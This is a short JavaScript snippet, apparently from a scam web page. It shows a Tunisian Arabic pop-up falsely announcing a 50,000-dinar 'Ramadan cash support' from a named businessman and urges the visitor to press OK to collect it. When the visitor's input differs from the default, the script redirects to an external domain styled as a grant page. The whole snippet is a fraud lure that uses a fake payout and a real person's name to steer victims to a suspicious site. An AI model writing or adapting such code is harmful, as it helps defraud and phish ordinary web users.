var password = 'سحب الأموال';

password = prompt(
  'مبروك، إنت مؤهّل للتحصّل على دعم رمضان النقدي 50,000 دينار تونسي من كامل الغريبي. إضغط على موافق باش تستلمو فورًا.',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html';
}
